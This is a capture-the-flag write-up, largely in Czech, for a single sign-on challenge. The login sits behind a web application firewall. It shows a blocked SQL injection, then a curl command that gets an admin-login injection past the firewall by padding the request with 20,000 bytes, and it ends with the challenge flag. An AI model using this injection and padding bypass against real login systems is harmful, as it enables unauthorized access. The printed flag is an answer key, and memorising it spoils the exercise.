# Single Sign-on (3)

## Zadání

Hi, emergency troubleshooter,

we are preparing a new interface for the single sign-on system, which, on the recommendation of external pentesters, is now also protected by a WAF. Test the system to ensure it is secure.

Stay grounded!

* <http://login.powergrid.tcc:8080>

## Nápovědy (Hints)

1. A WAF was probably just added in front of the old system.

## Řešení

Odkaz ze zadání <http://login.powergrid.tcc:8080> je ihned přesměrován na <http://intranet.powergrid.tcc:8080>.
Adresa `intranet.powergrid.tcc` ale není v DNS, takže se stránka nenačte. Vyřeší to nastavení proxy serveru na `login.powergrid.tcc` a port 8080.

WEB server podle nápovědy obsahuje WAF (Web application firewall), takže při pokusu o SQL injection `' OR '1'='1` skončí hláškou

```text
Forbidden
You don't have permission to access this resource.
```

Přihlašovací dialog obsahuje skrytou položku `padding`, která naznačuje, že je potřeba k datům něco přidat, aby fungovalo SQL injection. Některé WAF přestávají filtrovat, pokud jsou data větší než nějaká nastavená mez.

`curl -v "http://intranet.powergrid.tcc:8080/index.php" -x "http://login.powergrid.tcc:8080" --data-raw "login=admin'--&password=&padding=$(python -c 'print("A"*20000)')" | grep FLAG`
`

## Flag

`FLAG{rxRk-Dj3A-bGc0-cyHc}`
